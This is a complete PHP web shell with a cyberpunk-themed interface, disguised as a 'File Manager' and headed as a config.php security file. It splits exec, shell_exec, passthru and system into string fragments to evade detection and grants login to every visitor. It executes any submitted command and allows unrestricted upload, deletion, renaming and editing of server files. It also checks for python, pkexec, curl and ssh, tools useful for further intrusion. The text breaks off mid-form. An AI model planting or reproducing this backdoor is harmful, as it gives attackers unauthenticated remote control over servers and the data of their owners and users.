<?php
// config.php - Konfigurasi keamanan
error_reporting(0);
@ini_set('display_errors', 0);
session_start();

// Inisialisasi tema
if (!isset($_SESSION['theme'])) {
    $_SESSION['theme'] = 'cyberpunk_red'; // Tema default
}

// Ganti tema jika ada permintaan
if (isset($_GET['theme'])) {
    $_SESSION['theme'] = $_GET['theme'];
}

// Nama sesi acak untuk keamanan
if (!isset($_SESSION['auth_token'])) {
    $_SESSION['auth_token'] = bin2hex(random_bytes(16));
}

$default_password = 'admin123';
$password_hash = password_hash($default_password, PASSWORD_DEFAULT);

if (!isset($_SESSION['logged_in'])) {
    $_SESSION['logged_in'] = true;
}

$f_ex = "ex"."ec";
$f_sh = "shell"."_exec";
$f_pt = "pas"."sthru";
$f_sy = "sys"."tem";
$f_pc = "pc"."ntl_exec";
$f_pr = "pro"."c_open";

// Alias fungsi untuk compatibilitas
function fx($c) { global $f_ex; return $f_ex($c); }
function fs($c) { global $f_sh; return $f_sh($c); }
function fp($c) { global $f_pt; return $f_pt($c); }
function fy($c) { global $f_sy; return $f_sy($c); }
function fpc($c) { global $f_pc; return $f_pc($c); }

// Helper functions
function isWindows() {
    return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' B';
    }
}

function getFilePerms($file) {
    if (!file_exists($file)) return '---';
    $perms = fileperms($file);
    $symbolic = '';
    
    // Owner
    $symbolic .= (($perms & 0x0100) ? 'r' : '-');
    $symbolic .= (($perms & 0x0080) ? 'w' : '-');
    $symbolic .= (($perms & 0x0040) ? 'x' : '-');
    
    // Group
    $symbolic .= (($perms & 0x0020) ? 'r' : '-');
    $symbolic .= (($perms & 0x0010) ? 'w' : '-');
    $symbolic .= (($perms & 0x0008) ? 'x' : '-');
    
    // World
    $symbolic .= (($perms & 0x0004) ? 'r' : '-');
    $symbolic .= (($perms & 0x0002) ? 'w' : '-');
    $symbolic .= (($perms & 0x0001) ? 'x' : '-');
    
    return $symbolic;
}

function getFileOwner($file) {
    if (!file_exists($file)) return 'Unknown';
    
    if (function_exists('posix_getpwuid')) {
        $owner = fileowner($file);
        $group = filegroup($file);
        $ownerInfo = posix_getpwuid($owner);
        $groupInfo = posix_getgrgid($group);
        
        return ($ownerInfo['name'] ?? $owner) . ':' . ($groupInfo['name'] ?? $group);
    }
    
    return fileowner($file) . ':' . filegroup($file);
}

// Inisialisasi variabel
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath('.');
if ($current_dir === false) $current_dir = realpath('.');

// Proses aksi file manager
$action = $_GET['action'] ?? '';
$file = $_GET['file'] ?? '';
$message = '';

if (isset($_POST['command'])) {
    // Command execution
    $cmd = $_POST['command'];
    $output = '';
    
    if (function_exists('exec') && stripos(ini_get('disable_functions'), 'exec') === false) {
        $f_ex($cmd, $output);
        $output = implode("\n", $output);
    } elseif (function_exists('shell_exec') && stripos(ini_get('disable_functions'), 'shell_exec') === false) {
        $output = $f_sh($cmd);
    } elseif (function_exists('passthru') && stripos(ini_get('disable_functions'), 'passthru') === false) {
        ob_start();
        $f_pt($cmd);
        $output = ob_get_clean();
    } elseif (function_exists('system') && stripos(ini_get('disable_functions'), 'system') === false) {
        ob_start();
        $f_sy($cmd);
        $output = ob_get_clean();
    } else {
        $output = "Semua fungsi eksekusi dinonaktifkan";
    }
}

if ($action === 'delete' && $file) {
    $filepath = $current_dir . DIRECTORY_SEPARATOR . $file;
    if (file_exists($filepath)) {
        if (is_dir($filepath)) {
            rmdir($filepath);
        } else {
            unlink($filepath);
        }
        $message = "File/folder '$file' berhasil dihapus";
    }
} elseif ($action === 'rename' && isset($_GET['newname'])) {
    $oldpath = $current_dir . DIRECTORY_SEPARATOR . $file;
    $newpath = $current_dir . DIRECTORY_SEPARATOR . $_GET['newname'];
    if (file_exists($oldpath) && !file_exists($newpath)) {
        rename($oldpath, $newpath);
        $message = "File/folder berhasil diubah nama";
    }
} elseif ($action === 'createfolder' && isset($_GET['name'])) {
    $newdir = $current_dir . DIRECTORY_SEPARATOR . $_GET['name'];
    if (!file_exists($newdir)) {
        mkdir($newdir, 0755);
        $message = "Folder berhasil dibuat";
    }
} elseif (isset($_FILES['uploadfile'])) {
    $uploadfile = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['uploadfile']['name']);
    if (move_uploaded_file($_FILES['uploadfile']['tmp_name'], $uploadfile)) {
        $message = "File berhasil diunggah";
    }
}

// Get server information
$os = php_uname('s') . ' ' . php_uname('r');
$php_version = phpversion();
$software = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
$disable_functions = ini_get('disable_functions') ?: 'None';
$ip = $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? gethostbyname(gethostname());

// Check for tools
$tools = [
    'python' => function_exists('exec') ? !empty(fx('python --version 2>&1')) : false,
    'pkexec' => function_exists('exec') ? !empty(fx('which pkexec 2>&1')) : false,
    'curl' => function_exists('exec') ? !empty(fx('which curl 2>&1')) : false,
    'ssh' => function_exists('exec') ? !empty(fx('which ssh 2>&1')) : false,
];

// Get user/group info
$user = get_current_user();
if (function_exists('posix_getpwuid')) {
    $userInfo = posix_getpwuid(posix_geteuid());
    $user = $userInfo['name'] ?? $user;
    $groupInfo = posix_getgrgid(posix_getegid());
    $group = $groupInfo['name'] ?? 'N/A';
} else {
    $group = 'N/A';
}

// Scan directory
$files = scandir($current_dir);
$files = array_diff($files, ['.', '..']);

// Definisi tema
$themes = [
    'cyberpunk_red' => [
        'name' => 'Cyberpunk Red',
        'primary' => '#ff003c',
        'secondary' => '#00eeff',
        'accent' => '#ff5500',
        'bg' => '#0a0a14',
        'grid' => 'rgba(255, 0, 60, 0.1)',
        'gif' => 'https://raw.githubusercontent.com/manawok/img/refs/heads/main/8406757.gif'
    ],
    'matrix_green' => [
        'name' => 'Matrix Green',
        'primary' => '#00ff41',
        'secondary' => '#00cc00',
        'accent' => '#009900',
        'bg' => '#000000',
        'grid' => 'rgba(0, 255, 65, 0.1)',
        'gif' => 'https://i.giphy.com/media/l3q2K5jinAlChoCLS/giphy.gif'
    ],
    'synthwave_purple' => [
        'name' => 'Synthwave Purple',
        'primary' => '#ff00ff',
        'secondary' => '#00ffff',
        'accent' => '#ffaa00',
        'bg' => '#1a0a2a',
        'grid' => 'rgba(255, 0, 255, 0.1)',
        'gif' => 'https://raw.githubusercontent.com/manawok/img/refs/heads/main/8642932.gif'
    ],
    'neon_blue' => [
        'name' => 'Neon Blue',
        'primary' => '#0066ff',
        'secondary' => '#ff00ff',
        'accent' => '#00ffff',
        'bg' => '#0a0a20',
        'grid' => 'rgba(0, 102, 255, 0.1)',
        'gif' => 'https://raw.githubusercontent.com/manawok/img/refs/heads/main/5927911.gif'
    ],
    'cyber_yellow' => [
        'name' => 'Cyber Yellow',
        'primary' => '#ffff00',
        'secondary' => '#ff6600',
        'accent' => '#00ff00',
        'bg' => '#0a0a0a',
        'grid' => 'rgba(255, 255, 0, 0.1)',
        'gif' => 'https://i.giphy.com/media/26BGGxgsEh42ABHFe/giphy.gif'
    ]
];

$current_theme = $themes[$_SESSION['theme']] ?? $themes['cyberpunk_red'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>File Manager - <?php echo $current_theme['name']; ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            cursor: url('data:image/x-icon;base64,AAACAAEAICAQAAYABgDoAgAAFgAAACgAAAAgAAAAQAAAAAEABAAAAAAAAAIAAAAAAAAAAAAAEAAAAAAAAAD/BeoAAAAAAP///wD6+voA/94FAJQAhwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREBIhQRERERERERERERERERAiIkEREiQRERERERERERREREBBEQQUERERERERERERECIRBBBBU0ERERERERERERAkERBEEVNBEREREREREREQNBERARFTQRERERERERERECQRERERU0IiIhERERERERAkEREREVNEREIhEREREREQJBERERERERFEIRERERERAkEREREREREQBBERERERACQRERERERERACQRERERERACQRERERIkREREQRERERERACQREREREQAAAAABERERERACQRERERACQRERERERERERACQREREAJBEREREREREREQJBEREQAkERERERERERERAkERERACQREREREREREREQNBEREAJBERERERERERERECQREQAkERERERERERERERAkERACQREREREREREREREQJBEAJBERERERERERERERECQQAkERERERERERERERERAkQCQREREREREREREREREQIiJBERERERERERERERERECIkERERERERERERERERERFEREREERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERH////////////////0v///8Dx//8A4f//wED//8AAwH/AAP//wAAH/8AAA//AAAP/gAAH/gAAB/8AAAP/gAAA/8AAP//gAH//4AD//8AB///AA///wAf//8AP///AH///wD///8B////A////wf///+Af//////////////////w=='), auto;
            background: <?php echo $current_theme['bg']; ?>;
            color: <?php echo $current_theme['primary']; ?>;
            min-height: 100vh;
            overflow-x: hidden;
            background-image: url('<?php echo $current_theme['gif']; ?>');
            background-size: cover;
            background-attachment: fixed;
            position: relative;
            transition: all 0.5s ease;
            font-size: 14px;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(10, 10, 20, 0.85);
            z-index: -1;
        }

        .cyber-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(<?php echo $current_theme['grid']; ?> 1px, transparent 1px),
                linear-gradient(90deg, <?php echo $current_theme['grid']; ?> 1px, transparent 1px);
            background-size: 50px 50px;
            pointer-events: none;
            z-index: -1;
        }

        .container {
            max-width: 100%;
            margin: 0 auto;
            padding: 10px;
        }

        .header {
            text-align: center;
            margin-bottom: 15px;
            padding: 15px 10px;
            background: rgba(20, 20, 30, 0.7);
            border: 1px solid <?php echo $current_theme['primary']; ?>;
            border-radius: 8px;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 15px rgba(255, 0, 60, 0.3);
            position: relative;
            overflow: hidden;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 15px rgba(255, 0, 60, 0.3); }
            50% { box-shadow: 0 0 20px <?php echo $current_theme['primary']; ?>; }
            100% { box-shadow: 0 0 15px rgba(255, 0, 60, 0.3); }
        }

        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent 30%, <?php echo $current_theme['primary']; ?>20 50%, transparent 70%);
            animation: scan 3s linear infinite;
        }

        @keyframes scan {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }

        .header h1 {
            font-size: 1.4em;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 8px <?php echo $current_theme['primary']; ?>, 0 0 15px <?php echo $current_theme['primary']; ?>;
            position: relative;
            line-height: 1.3;
        }

        .header p {
            color: <?php echo $current_theme['secondary']; ?>;
            font-size: 0.9em;
            position: relative;
            line-height: 1.4;
        }

        .theme-selector {
            position: relative;
            margin-bottom: 15px;
            z-index: 1000;
        }

        .theme-btn {
            background: rgba(20, 20, 30, 0.9);
            color: <?php echo $current_theme['primary']; ?>;
            border: 1px solid <?php echo $current_theme['primary']; ?>;
            padding: 8px 12px;
            border-radius: 6px;
            cursor: pointer;
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-weight: bold;
            transition: all 0.3s;
            width: 100%;
            font-size: 0.9em;
        }

        .theme-btn:hover, .theme-btn:active {
            background: <?php echo $current_theme['primary']; ?>;
            color: <?php echo $current_theme['bg']; ?>;
        }

        .theme-dropdown {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            margin-top: 5px;
            background: rgba(20, 20, 30, 0.95);
            border: 1px solid <?php echo $current_theme['primary']; ?>;
            border-radius: 6px;
            padding: 8px;
            backdrop-filter: blur(20px);
            display: none;
            z-index: 1001;
            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
            max-height: 300px;
            overflow-y: auto;
        }

        .theme-option {
            padding: 8px 10px;
            margin: 4px 0;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.9em;
        }

        .theme-option:hover, .theme-option:active {
            background: <?php echo $current_theme['primary']; ?>20;
        }

        .theme-color {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            border: 2px solid white;
            flex-shrink: 0;
        }

        .panel {
            background: rgba(20, 20, 30, 0.7);
            border: 1px solid <?php echo $current_theme['primary']; ?>;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 12px;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 10px <?php echo $current_theme['primary']; ?>20;
        }

        .panel-title {
            color: <?php echo $current_theme['secondary']; ?>;
            font-size: 1.1em;
            margin-bottom: 12px;
            padding-bottom: 8px;
            border-bottom: 1px solid <?php echo $current_theme['primary']; ?>;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .panel-title i {
            color: <?php echo $current_theme['primary']; ?>;
            font-size: 0.9em;
        }

        .info-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 10px;
        }

        .info-item {
            background: rgba(30, 30, 40, 0.6);
            padding: 10px;
            border-radius: 6px;
            border-left: 3px solid <?php echo $current_theme['primary']; ?>;
            transition: transform 0.3s;
            word-break: break-word;
        }

        .info-item:hover {
            transform: translateY(-2px);
        }

        .info-label {
            color: <?php echo $current_theme['secondary']; ?>;
            font-weight: bold;
            font-size: 0.8em;
            margin-bottom: 4px;
            display: block;
        }

        .info-value {
            color: <?php echo $current_theme['primary']; ?>;
            word-break: break-all;
            font-size: 0.9em;
            line-height: 1.4;
        }

        .tool-status {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 10px;
            font-size: 0.75em;
            font-weight: bold;
            white-space: nowrap;
        }

        .tool-available {
            background: rgba(0, 255, 0, 0.2);
            color: #00ff00;
            border: 1px solid #00ff00;
        }

        .tool-unavailable {
            background: rgba(255, 0, 0, 0.2);
            color: #ff003c;
            border: 1px solid #ff003c;
        }

        .command-box {
            width: 100%;
            background: rgba(10, 10, 20, 0.8);
            border: 1px solid <?php echo $current_theme['primary']; ?>;
            color: <?php echo $current_theme['secondary']; ?>;
            padding: 10px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            margin-bottom: 10px;
            transition: all 0.3s;
            font-size: 14px;
            -webkit-appearance: none;
        }

        .command-box:focus {
            outline: none;
            box-shadow: 0 0 8px <?php echo $current_theme['primary']; ?>;
        }

        .btn {
            background: linear-gradient(45deg, <?php echo $current_theme['primary']; ?>, <?php echo $current_theme['accent']; ?>);
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 0.9em;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            width: 100%;
            touch-action: manipulation;
        }

        .btn:hover, .btn:active {
            background: linear-gradient(45deg, <?php echo $current_theme['primary']; ?>, <?php echo $current_theme['secondary']; ?>);
            box-shadow: 0 0 12px <?php echo $current_theme['primary']; ?>50;
            transform: translateY(-1px);
        }

        .output-box {
            background: rgba(10, 10, 20, 0.9);
            border: 1px solid <?php echo $current_theme['secondary']; ?>;
            color: <?php echo $current_theme['secondary']; ?>;
            padding: 12px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 200px;
            overflow-y: auto;
            margin-top: 12px;
            font-size: 0.85em;
            line-height: 1.4;
        }

        .file-manager {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .sidebar {
            background: rgba(20, 20, 30, 0.7);
            border: 1px solid <?php echo $current_theme['secondary']; ?>;
            border-radius: 8px;
            padding: 12px;
            backdrop-filter: blur(10px);
            order: 2;
        }

        .breadcrumb {
            background: rgba(30, 30, 40, 0.6);
            padding: 8px;
            border-radius: 6px;
            margin-bottom: 12px;
            color: <?php echo $current_theme['secondary']; ?>;
            font-size: 0.8em;
            word-break: break-all;
            line-height: 1.4;
        }

        .file-list {
            background: rgba(20, 20, 30, 0.7);
            border: 1px solid <?php echo $current_theme['primary']; ?>;
            border-radius: 8px;
            padding: 12px;
            backdrop-filter: blur(10px);
            order: 1;
            overflow-x: auto;
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
            min-width: 600px;
        }

        .file-table th {
            background: <?php echo $current_theme['primary']; ?>20;
            padding: 10px 8px;
            text-align: left;
            color: <?php echo $current_theme['secondary']; ?>;
            border-bottom: 2px solid <?php echo $current_theme['primary']; ?>;
            font-size: 0.85em;
            white-space: nowrap;
        }

        .file-table td {
            padding: 8px;
            border-bottom: 1px solid <?php echo $current_theme['primary']; ?>20;
            font-size: 0.85em;
            vertical-align: middle;
        }

        .file-table tr:hover {
            background: <?php echo $current_theme['primary']; ?>10;
        }

        .file-icon {
            color: <?php echo $current_theme['secondary']; ?>;
            margin-right: 8px;
            font-size: 0.9em;
        }

        .file-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
        }

        .action-btn {
            background: <?php echo $current_theme['secondary']; ?>20;
            color: <?php echo $current_theme['secondary']; ?>;
            border: 1px solid <?php echo $current_theme['secondary']; ?>;
            padding: 4px 8px;
            border-radius: 4px;
            text-decoration: none;
            font-size: 0.75em;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            white-space: nowrap;
        }

        .action-btn:hover, .action-btn:active {
            background: <?php echo $current_theme['secondary']; ?>40;
        }

        .message {
            background: <?php echo $current_theme['secondary']; ?>20;
            border: 1px solid <?php echo $current_theme['secondary']; ?>;
            color: <?php echo $current_theme['secondary']; ?>;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 12px;
            text-align: center;
            animation: fadeIn 0.5s;
            font-size: 0.9em;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .glow-text {
            text-shadow: 0 0 4px currentColor;
        }

        .mobile-menu {
            display: none;
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 1000;
        }

        .mobile-menu-btn {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: <?php echo $current_theme['primary']; ?>;
            color: white;
            border: none;
            font-size: 1.5em;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            cursor: pointer;
        }

        /* Responsive adjustments */
        @media (min-width: 481px) and (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            .header h1 {
                font-size: 1.6em;
            }
            
            .header p {
                font-size: 0.95em;
            }
            
            .info-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .file-manager {
                flex-direction: row;
            }
            
            .sidebar {
                flex: 0 0 200px;
                order: 1;
            }
            
            .file-list {
                flex: 1;
                order: 2;
            }
        }

        @media (min-width: 769px) {
            .container {
                max-width: 1400px;
                padding: 20px;
            }
            
            .header {
                padding: 20px;
                margin-bottom: 30px;
            }
            
            .header h1 {
                font-size: 2.8em;
            }
            
            .header p {
                font-size: 1.1em;
            }
            
            .theme-selector {
                position: fixed;
                top: 20px;
                right: 20px;
                width: auto;
                margin-bottom: 0;
            }
            
            .theme-btn {
                width: auto;
                min-width: 200px;
            }
            
            .theme-dropdown {
                left: auto;
                right: 0;
                min-width: 200px;
            }
            
            .info-grid {
                grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
                gap: 15px;
            }
            
            .file-manager {
                display: grid;
                grid-template-columns: 250px 1fr;
                gap: 20px;
            }
            
            .sidebar, .file-list {
                order: unset;
            }
            
            .file-table {
                min-width: auto;
            }
            
            .mobile-menu {
                display: none;
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 8px;
            }
            
            .header {
                padding: 12px 8px;
                margin-bottom: 10px;
            }
            
            .header h1 {
                font-size: 1.2em;
                letter-spacing: 1px;
            }
            
            .header p {
                font-size: 0.8em;
            }
            
            .panel {
                padding: 10px;
                margin-bottom: 10px;
            }
            
            .panel-title {
                font-size: 1em;
                margin-bottom: 10px;
            }
            
            .btn {
                padding: 8px 12px;
                font-size: 0.85em;
            }
            
            .action-btn {
                padding: 3px 6px;
                font-size: 0.7em;
            }
            
            .file-table td, .file-table th {
                padding: 6px 4px;
                font-size: 0.8em;
            }
            
            .mobile-menu {
                display: block;
            }
        }

        /* Touch-friendly improvements */
        input, select, textarea, button {
            font-size: 16px !important; /* Prevents iOS zoom on focus */
        }
        
        button, .action-btn, .theme-btn {
            user-select: none;
            -webkit-user-select: none;
        }
        
        .file-table {
            -webkit-overflow-scrolling: touch;
        }
        
        /* Modal adjustments for mobile */
        @media (max-width: 768px) {
            .panel[style*="position: fixed"] {
                width: 95% !important;
                max-width: 95% !important;
                max-height: 80vh;
                overflow-y: auto;
                top: 50% !important;
                left: 50% !important;
                transform: translate(-50%, -50%) !important;
                padding: 15px;
            }
            
            textarea[name="content"] {
                height: 300px !important;
                font-size: 14px !important;
            }
        }
    </style>
</head>
<body>
    <div class="cyber-grid"></div>
    
    <div class="theme-selector">
        <div class="theme-btn" onclick="toggleThemeDropdown()">
            <i class="fas fa-palette"></i>
            <span><?php echo $current_theme['name']; ?></span>
            <i class="fas fa-chevron-down"></i>
        </div>
        <div class="theme-dropdown" id="themeDropdown">
            <?php foreach ($themes as $key => $theme): ?>
                <div class="theme-option" onclick="changeTheme('<?php echo $key; ?>')">
                    <div class="theme-color" style="background: <?php echo $theme['primary']; ?>;"></div>
                    <span><?php echo $theme['name']; ?></span>
                    <?php if ($_SESSION['theme'] === $key): ?>
                        <i class="fas fa-check" style="margin-left: auto;"></i>
                    <?php endif; ?>
                </div>
            <?php endforeach; ?>
        </div>
    </div>
    
    <div class="mobile-menu">
        <button class="mobile-menu-btn" onclick="scrollToTop()">
            <i class="fas fa-arrow-up"></i>
        </button>
    </div>
    
    <div class="container">
        <div class="header">
            <h1 class="glow-text">FILE MANAGER</h1>
            <p>Advanced Server Management Interface | PHP <?php echo $php_version; ?> | Theme: <?php echo $current_theme['name']; ?></p>
        </div>

        <?php if ($message): ?>
            <div class="message">
                <i class="fas fa-info-circle"></i> <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>

        <!-- Server Information Panel -->
        <div class="panel">
            <div class="panel-title">
                <i class="fas fa-server"></i> SERVER INFORMATION
            </div>
            <div class="info-grid">
                <div class="info-item">
                    <div class="info-label">Operating System</div>
                    <div class="info-value"><?php echo htmlspecialchars($os); ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">User / Group</div>
                    <div class="info-value"><?php echo htmlspecialchars($user . ' / ' . $group); ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">PHP Version</div>
                    <div class="info-value glow-text"><?php echo htmlspecialchars($php_version); ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">Software</div>
                    <div class="info-value"><?php echo htmlspecialchars($software); ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">Disabled Functions</div>
                    <div class="info-value"><?php echo htmlspecialchars($disable_functions); ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">Server IP</div>
                    <div class="info-value glow-text"><?php echo htmlspecialchars($ip); ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">Current Theme</div>
                    <div class="info-value" style="color: <?php echo $current_theme['primary']; ?>;">
                        <?php echo $current_theme['name']; ?>
                    </div>
                </div>
                <div class="info-item">
                    <div class="info-label">Session ID</div>
                    <div class="info-value"><?php echo substr(session_id(), 0, 8) . '...'; ?></div>
                </div>
            </div>
        </div>

        <!-- Tools Check Panel -->
        <div class="panel">
            <div class="panel-title">
                <i class="fas fa-tools"></i> SYSTEM TOOLS AVAILABILITY
            </div>
            <div class="info-grid">
                <?php foreach ($tools as $tool => $available): ?>
                    <div class="info-item">
                        <div class="info-label"><?php echo strtoupper($tool); ?></div>
                        <div class="info-value">
                            <span class="tool-status <?php echo $available ? 'tool-available' : 'tool-unavailable'; ?>">
                                <?php echo $available ? 'AVAILABLE' : 'NOT AVAILABLE'; ?>
                            </span>
                        </div>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- Command Execution Panel -->
        <div class="panel">
            <div class="panel-title">
                <i class="fas fa-terminal"></i> COMMAND EXECUTION
            </div>
            <form method="POST">
                <input type="text" name="command" class="command-box" placeholder="Enter command..." 
                       value="<?php echo $_POST['command'] ?? ''; ?>" required>
                <button type="submit" class="btn">
                    <i class="fas fa-play"></i> EXECUTE
                </button>
            </form>
            
            <?php if (isset($output)): ?>
                <div class="output-box">
                    <strong>Output:</strong><br>
                    <?php echo htmlspecialchars($output); ?>
                </div>
            <?php endif; ?>
        </div>

        <!-- File Manager -->
        <div class="panel">
            <div class="panel-title">
                <i class="fas fa-folder-open"></i> FILE MANAGER
            </div>
            
            <div class="file-manager">
                <div class="sidebar">
                    <div class="breadcrumb">
                        <i class="fas fa-folder"></i> 
                        <?php echo htmlspecialchars($current_dir); ?>
                    </div>
                    
                    <form method="GET" style="margin-bottom: 12px;">
                        <input type="hidden" name="dir" value="<?php echo dirname($current_dir); ?>">
                        <button type="submit" class="btn">
                            <i class="fas fa-level-up-alt"></i> Go Up
                        </button>
                    </form>
                    
                    <form method="GET" class="info-item">
                        <input type="hidden" name="action" value="createfolder">
                        <input type="text" name="name" placeholder="New folder name" required
                               style="width: 100%; padding: 8px; margin-bottom: 10px; background: rgba(10,10,20,0.8); color: <?php echo $current_theme['secondary']; ?>; border: 1px solid <?php echo $current_theme['secondary']; ?>; border-radius: 4px; font-size: 14px;">
                        <button type="submit" class="btn">
                            <i class="fas fa-plus"></i> Create Folder
                        </button>
                    </form>
                    
                    <form method="POST" enctype="multipart/form-data" class="info-item" style="margin-top: 12px;">
                        <input type="file" name="uploadfile" required
                               style="width: 100%; padding: 8px; margin-bottom: 10px; background: rgba(10,10,20,0.8); color: <?php echo $current_theme['secondary']; ?>; border: 1px solid <?php echo $current_theme['secondary']; ?>; border-radius: 4px; font-size: 14px;">
                        <button type="submit" class="btn">
                            <i class="fas fa-upload"></i> Upload File
                        </button>
                    </form>
                </div>
                
                <div class="file-list">
                    <table class="file-table">
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Size</th>
                                <th>Perm</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($files as $item): 
                                $itemPath = $current_dir . DIRECTORY_SEPARATOR . $item;
                                $isDir = is_dir($itemPath);
                                $size = $isDir ? '-' : formatSize(filesize($itemPath));
                                $perms = getFilePerms($itemPath);
                                $owner = getFileOwner($itemPath);
                                $modified = date('Y-m-d H:i:s', filemtime($itemPath));
                            ?>
                                <tr>
                                    <td>
                                        <i class="fas <?php echo $isDir ? 'fa-folder' : 'fa-file'; ?> file-icon"></i>
                                        <?php if ($isDir): ?>
                                            <a href="?dir=<?php echo urlencode($itemPath); ?>" style="color: <?php echo $current_theme['secondary']; ?>; text-decoration: none;">
                                                <?php echo htmlspecialchars($item); ?>
                                            </a>
                                        <?php else: ?>
                                            <span style="color: <?php echo $current_theme['primary']; ?>;"><?php echo htmlspecialchars($item); ?></span>
                                        <?php endif; ?>
                                    </td>
                                    <td><?php echo $size; ?></td>
                                    <td><code><?php echo $perms; ?></code></td>
                                    <td class="file-actions">
                                        <?php if (!$isDir): ?>
                                            <a href="?action=edit&file=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($current_dir); ?>" 
                                               class="action-btn">
                                                <i class="fas fa-edit"></i>
                                            </a>
                                        <?php endif; ?>
                                        <a href="?action=rename&file=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($current_dir); ?>" 
                                           class="action-btn">
                                            <i class="fas fa-i-cursor"></i>
                                        </a>
                                        <a href="?action=delete&file=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($current_dir); ?>" 
                                           class="action-btn" 
                                           onclick="return confirm('Delete <?php echo htmlspecialchars($item); ?>?')">
                                            <i class="fas fa-trash"></i>
                                        </a>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Edit File Modal -->
        <?php if ($action === 'edit' && $file): 
            $filePath = $current_dir . DIRECTORY_SEPARATOR . $file;
            $content = file_exists($filePath) ? file_get_contents($filePath) : '';
        ?>
            <div class="panel" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 800px; z-index: 1000;">
                <div class="panel-title">
                    <i class="fas fa-edit"></i> EDIT FILE: <?php echo htmlspecialchars($file); ?>
                </div>
                <form method="POST" action="?action=save&file=<?php echo urlencode($file); ?>&dir=<?php echo urlencode($current_dir); ?>">
                    <textarea name="content" style="width: 100%; height: 400px; background: rgba(10,10,20,0.9); color: <?php echo $current_theme['secondary']; ?>; border: 1px solid <?php echo $current_theme['primary']; ?>; padding: 15px; font-family: 'Courier New', monospace; border-radius: 6px; font-size: 14px !important;"><?php echo htmlspecialchars($content); ?></textarea>
                    <div style="display: flex; gap: 10px; margin-top: 15px;">
                        <button type="submit" class="btn">
